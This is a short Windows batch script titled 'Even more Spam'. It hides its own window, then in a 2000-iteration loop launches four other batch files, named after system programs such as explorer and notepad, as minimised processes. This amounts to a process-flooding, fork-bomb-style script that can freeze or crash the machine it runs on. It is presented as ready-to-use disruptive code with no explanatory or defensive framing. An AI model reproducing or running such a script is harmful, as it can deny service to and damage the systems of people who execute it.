:: Even more Spam
@echo off
if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
FOR /L %%A IN (1,1,2000) DO (
    start /MIN "" ".\explorer.bat"
    start /MIN "" ".\notepad.bat"
    start /MIN "" ".\sandbox.bat"
    start /MIN "" ".\launch.bat"
)
